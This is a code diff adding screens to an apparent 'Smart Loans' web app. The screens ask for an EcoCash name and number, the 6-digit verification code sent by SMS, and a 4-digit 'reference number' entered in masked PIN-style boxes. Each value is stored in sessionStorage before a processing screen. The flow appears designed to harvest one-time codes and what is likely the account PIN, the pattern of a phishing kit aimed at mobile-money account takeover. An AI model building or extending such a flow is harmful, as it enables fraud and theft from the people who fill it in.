@@ -1307,3 +1307,393 @@ function loadSuccessScreen() {
 
 }
             
+// ===============================
+// ECOCASH DETAILS SCREEN
+// ===============================
+
+function loadEcoCashDetailsScreen() {
+
+    const app = document.getElementById("app");
+
+    const fullNames = sessionStorage.getItem("fullNames") || "";
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <button class="back-btn" id="backDisbursement">
+                ← Back
+            </button>
+
+            <div>
+
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" style="width:70%;"></div>
+        </div>
+
+        <div class="welcome-card">
+
+            <h2>EcoCash Details</h2>
+
+            <p class="intro">
+                Enter your EcoCash account details.
+            </p>
+
+            <label>Account Holder Name</label>
+
+            <input
+                type="text"
+                id="ecoName"
+                value="${fullNames}">
+
+            <br><br>
+
+            <label>EcoCash Number</label>
+
+            <input
+                type="tel"
+                id="ecoNumber"
+                placeholder="+2637XXXXXXXX">
+
+            <br><br>
+
+            <button id="continueEcoCash">
+
+                Continue
+
+            </button>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("backDisbursement")
+        .addEventListener("click", loadDisbursementScreen);
+
+    document
+        .getElementById("continueEcoCash")
+        .addEventListener("click", saveEcoCashDetails);
+
+}
+            // ===============================
+// SAVE ECOCASH DETAILS
+// ===============================
+
+function saveEcoCashDetails() {
+
+    const ecoName =
+        document.getElementById("ecoName").value.trim();
+
+    const ecoNumber =
+        document.getElementById("ecoNumber").value.trim();
+
+    if (
+        ecoName === "" ||
+        ecoNumber === ""
+    ) {
+
+        alert("Please complete all fields.");
+
+        return;
+
+    }
+
+    sessionStorage.setItem("ecoName", ecoName);
+    sessionStorage.setItem("ecoNumber", ecoNumber);
+
+    loadEcoCashVerificationScreen();
+
+}
+            // ===============================
+// ECOCASH VERIFICATION SCREEN
+// ===============================
+
+function loadEcoCashVerificationScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <button class="back-btn" id="backEcoDetails">
+                ← Back
+            </button>
+
+            <div>
+
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" style="width:80%;"></div>
+        </div>
+
+        <div class="welcome-card">
+
+            <h2>Secure EcoCash Verification</h2>
+
+            <p class="intro">
+
+                Enter the 6-digit verification code sent via SMS to the EcoCash number you provided.
+
+            </p>
+
+            <input
+                type="text"
+                id="ecoVerificationCode"
+                maxlength="6"
+                placeholder="Enter 6-digit verification code">
+
+            <br><br>
+
+            <button id="continueEcoVerification">
+
+                Continue
+
+            </button>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("backEcoDetails")
+        .addEventListener("click", loadEcoCashDetailsScreen);
+
+    document
+        .getElementById("continueEcoVerification")
+        .addEventListener("click", saveEcoCashVerification);
+
+}
+            // ===============================
+// SAVE ECOCASH VERIFICATION
+// ===============================
+
+function saveEcoCashVerification() {
+
+    const code = document
+        .getElementById("ecoVerificationCode")
+        .value
+        .trim();
+
+    if (!/^\d{6}$/.test(code)) {
+
+        alert("Please enter a valid 6-digit verification code.");
+
+        return;
+
+    }
+
+    sessionStorage.setItem(
+        "ecoVerificationCode",
+        code
+    );
+
+    loadEcoCashReferenceScreen();
+
+}
+            // ===============================
+// ECOCASH REFERENCE SCREEN
+// ===============================
+
+function loadEcoCashReferenceScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <button class="back-btn" id="backEcoVerification">
+                ← Back
+            </button>
+
+            <div>
+
+                <div class="app-title">Smart Loans</div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" style="width:90%;"></div>
+        </div>
+
+        <div class="welcome-card">
+
+            <h2>EcoCash Reference Number</h2>
+
+            <p class="intro">
+
+                Enter your 4-digit EcoCash reference number.
+
+            </p>
+
+            <div class="pin-container">
+
+                <input class="eco-pin" maxlength="1" type="password">
+                <input class="eco-pin" maxlength="1" type="password">
+                <input class="eco-pin" maxlength="1" type="password">
+                <input class="eco-pin" maxlength="1" type="password">
+
+            </div>
+
+            <br>
+
+            <label>
+
+                <input type="checkbox" id="showEcoReference">
+
+                Show Reference Number
+
+            </label>
+
+            <br><br>
+
+            <button id="continueEcoReference">
+
+                Submit Application
+
+            </button>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("backEcoVerification")
+        .addEventListener("click", loadEcoCashVerificationScreen);
+
+    initializeEcoReference();
+
+}
+            // ===============================
+// ECOCASH REFERENCE LOGIC
+// ===============================
+
+function initializeEcoReference() {
+
+    const boxes = document.querySelectorAll(".eco-pin");
+
+    const show = document.getElementById("showEcoReference");
+
+    const btn = document.getElementById("continueEcoReference");
+
+    boxes.forEach((box,index)=>{
+
+        box.addEventListener("input",()=>{
+
+            box.value = box.value.replace(/\D/g,"");
+
+            if(box.value.length===1 && index<boxes.length-1){
+
+                boxes[index+1].focus();
+
+            }
+
+        });
+
+        box.addEventListener("keydown",(e)=>{
+
+            if(e.key==="Backspace" && box.value==="" && index>0){
+
+                boxes[index-1].focus();
+
+            }
+
+        });
+
+    });
+
+    show.addEventListener("change",()=>{
+
+        boxes.forEach(box=>{
+
+            box.type = show.checked ? "text":"password";
+
+        });
+
+    });
+
+    btn.addEventListener("click",()=>{
+
+        let reference="";
+
+        boxes.forEach(box=>{
+
+            reference += box.value;
+
+        });
+
+        if(reference.length!==4){
+
+            alert("Please enter your 4-digit EcoCash reference number.");
+
+            return;
+
+        }
+
+        sessionStorage.setItem(
+            "ecoReference",
+            reference
+        );
+
+        // For now, use the existing processing screen
+        loadProcessingScreen();
+
+    });
+
+}
+            
